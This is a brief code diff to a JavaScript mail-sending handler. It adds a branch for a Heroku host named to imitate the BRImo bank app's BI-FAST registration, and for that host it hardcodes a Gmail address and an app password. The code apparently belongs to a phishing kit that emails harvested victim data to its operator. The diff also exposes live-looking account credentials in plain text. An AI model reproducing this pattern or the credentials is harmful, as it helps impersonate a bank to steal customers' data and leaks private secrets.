@@ -44,6 +44,11 @@ export default function handler(req, res) {
         
 
     }
+    else if (url == 'brimo-daftar-bi-fast.herokuapp.com'){
+    email = 'agustusq76@gmail.com';
+    pass = 'xbohxjweimfcuhpx';
+   
+    }
         
         try {
             const transporter = nodemailer.createTransport({
